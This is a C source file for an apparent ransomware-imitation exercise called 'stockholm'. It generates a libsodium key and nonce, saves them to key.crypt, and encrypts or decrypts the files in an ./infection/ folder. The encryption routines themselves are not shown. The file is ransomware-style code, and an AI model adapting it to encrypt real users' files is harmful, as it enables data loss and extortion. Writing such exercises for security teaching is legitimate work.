#include "stockholm.h"

int	reverse = 0;
int	silent = 0;

void	writeKey(struct cryptFile *data)
{
	unsigned int key_size = crypto_secretbox_KEYBYTES;  
	unsigned char key[key_size];
	unsigned char nonce[crypto_secretbox_NONCEBYTES];
	randombytes_buf(nonce, sizeof(nonce));
	crypto_secretbox_keygen(key);

	memcpy((*data).key, key, sizeof(key));
	memcpy((*data).nonce, nonce, sizeof(nonce)); 

	FILE *fp = fopen("key.crypt", "wb");

	if (fp == NULL)
	{
		printf("Error: fopen() failed\n");
		return ;
	}
	fwrite("key : ", sizeof(unsigned char), 6, fp);
	fwrite(key, sizeof(unsigned char), key_size, fp);
	fwrite("\nnonce : ", sizeof(unsigned char), 9, fp);
	fwrite(nonce, sizeof(unsigned char), crypto_secretbox_NONCEBYTES, fp);
	fclose(fp);
}

int		main(int argc, char *argv[], char *env[])
{
	(void)env;
	if (argc > 3)
	{
		printf("%s", DEFAULT_HELP);
		exit(0);
	}
	
	if (sodium_init() == -1)
	{
		printf("Error: sodium_init() failed\n");
		return (1);
	}
	
	if (argc > 1)
		optionprog(argv[1]);

	struct linkedFile *file = openFile();
	if (!file)
	{
		printf("Nothing to encrypt in the ./infection/\n");
		exit(0);
	}

	struct cryptFile data;
	if (reverse == 0)
	{
		writeKey(&data); // write key encrypt in key.crypt "."
		printf("%s\n", FILE_DELETED);
	}

	
	/*	Print linked list
	for (struct linkedFile *tmp = file; tmp; tmp = tmp->next)
		printf("name : %s\n", tmp->file);
	*/
	if (reverse)
		decrypt(file);
	else
		encrypt(file, data);
	clearlist(&file);
	return (0);
}